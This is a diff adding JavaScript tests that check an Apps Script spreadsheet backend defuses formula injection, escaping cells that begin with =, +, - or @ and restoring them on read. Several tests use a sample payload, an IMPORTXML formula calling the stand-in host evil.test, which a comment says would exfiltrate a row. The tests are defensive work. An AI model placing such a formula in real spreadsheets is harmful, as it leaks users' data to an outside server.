@@ -2,7 +2,7 @@ import { readFileSync } from 'node:fs';
 import { join, dirname } from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { test, describe, assert, setSuite } from './harness.mjs';
-import { backend } from './appsscript.mjs';
+import { backend, loadAppsScript } from './appsscript.mjs';
 
 const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
 
@@ -913,5 +913,73 @@ describe('the deployment setting is described the same way everywhere', () => {
     const manifest = JSON.parse(read('apps-script/appsscript.json'));
     assert.equal(manifest.oauthScopes.includes(
       'https://www.googleapis.com/auth/script.send_mail'), true);
+  });
+});
+
+/* ------------------------------------------------ what reaches a cell */
+
+describe('a formula cannot reach the workbook', () => {
+  /*
+   * The threat `Sheets.gs` names in its own comment: a value beginning `=`,
+   * `+`, `-` or `@` is a formula, and `=IMPORTXML("http://evil.test","//x")`
+   * in a cell exfiltrates the row the moment anybody opens the workbook.
+   *
+   * `tests/security.test.mjs` covers `escapeForSheet`, which is exported,
+   * correct, and **called by nothing** — the repository's own sentence
+   * applies: a test of a function nothing calls proves the function works and
+   * says nothing about the application. These go through the deployed `.gs`.
+   */
+  const sheets = () => loadAppsScript(['Sheets.gs'], {}, ['recordToRow', 'rowToRecord']);
+
+  test('a scalar cell is defused', () => {
+    const [payee] = sheets().recordToRow(['payee'],
+      { payee: '=IMPORTXML("http://evil.test","//x")' });
+    assert.equal(payee, '\'=IMPORTXML("http://evil.test","//x")');
+  });
+
+  test('and so is a list, which was reaching Sheets as a formula', () => {
+    // Measured before the fix: `tags` joined to
+    // `=IMPORTXML("http://evil.test","//x"), groceries` — the scalar beside
+    // it escaped and this one not. Sheets reads the cell, so what matters is
+    // the first character of the joined string, not that it began as a list.
+    const [tags] = sheets().recordToRow(['tags'],
+      { tags: ['=IMPORTXML("http://evil.test","//x")', 'groceries'] });
+    assert.not(/^[=+\-@\t\r]/.test(tags), `a list cell reached Sheets as a formula: ${tags}`);
+    assert.equal(tags, '\'=IMPORTXML("http://evil.test","//x"), groceries');
+  });
+
+  test('every leading character Sheets treats as a formula', () => {
+    const { recordToRow } = sheets();
+    for (const lead of ['=', '+', '-', '@']) {
+      const [cell] = recordToRow(['tags'], { tags: [`${lead}payload`] });
+      assert.equal(cell, `'${lead}payload`, `a list starting ${lead} was not defused`);
+    }
+  });
+
+  test('an ordinary value is not touched', () => {
+    // The other direction: a defence that escapes everything corrupts every
+    // name in the workbook.
+    const { recordToRow } = sheets();
+    assert.equal(recordToRow(['payee'], { payee: 'Reliance Fresh' })[0], 'Reliance Fresh');
+    assert.deep(recordToRow(['tags'], { tags: ['food', 'delivery'] }), ['food, delivery']);
+  });
+
+  test('and the escape comes back off on the way in', () => {
+    // Never silently lose data: what the household typed is what they get.
+    const { recordToRow, rowToRecord } = sheets();
+    const headers = ['payee', 'tags'];
+    const row = recordToRow(headers, { payee: '-500 adjustment', tags: ['@mention'] });
+    const back = rowToRecord(headers, row);
+    assert.equal(back.payee, '-500 adjustment');
+    assert.equal(back.tags, '@mention');
+  });
+
+  test('a stringified object needs no escaping and gets none', () => {
+    // `JSON.stringify` always yields `{`, `[`, a quote or a digit, none of
+    // which Sheets reads as a formula. Left alone deliberately, so this
+    // records the reasoning rather than leaving it to look like an omission.
+    const [cell] = sheets().recordToRow(['meta'], { meta: { a: '=BAD()' } });
+    assert.equal(cell, '{"a":"=BAD()"}');
+    assert.not(/^[=+\-@]/.test(cell));
   });
 });
